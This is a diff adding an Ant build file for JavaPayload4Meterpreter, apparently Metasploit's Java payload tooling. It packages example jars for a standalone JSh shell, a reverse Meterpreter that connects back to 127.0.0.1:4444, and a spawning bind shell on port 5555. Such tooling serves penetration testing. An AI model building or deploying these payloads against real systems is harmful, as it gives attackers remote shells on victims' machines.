@@ -1,0 +1,68 @@
+<?xml version="1.0"?>
+<project name="JavaPayload4Meterpreter" default="jar">
+
+	<target name="clean">
+		<delete dir="build" />
+	</target>
+
+	<target name="compile">
+		<mkdir dir="build" />
+		<javac srcdir="src" destdir="build" source="1.1" target="1.1" debug="no" />
+	</target>
+
+	<target name="jar" depends="compile">
+		<!-- main jar -->
+		<jar destfile="JavaPayload4Meterpreter.jar" basedir="build" />
+		<!-- example 1: standalone JSh -->
+		<propertyfile file="build/metasploit.dat">
+			<entry key="LPORT" value="0" />
+			<entry key="EmbeddedStage" value="JSh"/>
+		</propertyfile>
+		<jar destfile="example-standalone-jsh.jar">
+			<manifest>
+				<attribute name="Main-Class" value="metasploit.Payload"/>
+			</manifest>
+			<fileset dir="build">
+    			<include name="metasploit/Payload.class"/>
+    			<include name="javapayload/stage/Stage.class"/>
+				<include name="javapayload/stage/JSh*.class"/>
+				<include name="metasploit.dat"/>
+			</fileset>
+		</jar>
+		<delete file="build/metasploit.dat"/>
+		<!-- example 2: reverse meterpreter (like loader.jar) -->
+		<propertyfile file="build/metasploit.dat">
+			<entry key="LPORT" value="4444" />
+			<entry key="LHOST" value="127.0.0.1" />
+			<entry key="EmbeddedStage" value="Meterpreter"/>
+		</propertyfile>
+		<jar destfile="example-reverse-meterpreter.jar">
+			<manifest>
+				<attribute name="Main-Class" value="metasploit.Payload"/>
+			</manifest>
+			<fileset dir="build">
+    			<include name="metasploit/Payload.class"/>
+    			<include name="javapayload/stage/Stage.class"/>
+				<include name="com/metasploit/meterpreter/MemoryBufferURL*.class"/>
+				<include name="javapayload/stage/Meterpreter.class"/>
+				<include name="metasploit.dat"/>
+			</fileset>
+		</jar>
+		<delete file="build/metasploit.dat"/>
+		<!-- example 3: spawning bind -->
+		<propertyfile file="build/metasploit.dat">
+			<entry key="Spawn" value="2"/>
+			<entry key="LPORT" value="5555" />
+		</propertyfile>
+		<jar destfile="example-spawn-bind.jar">
+			<manifest>
+				<attribute name="Main-Class" value="metasploit.Payload"/>
+			</manifest>
+			<fileset dir="build">
+    			<include name="metasploit/Payload.class"/>
+				<include name="metasploit.dat"/>
+			</fileset>
+		</jar>
+		<delete file="build/metasploit.dat"/>
+	</target>
+</project>
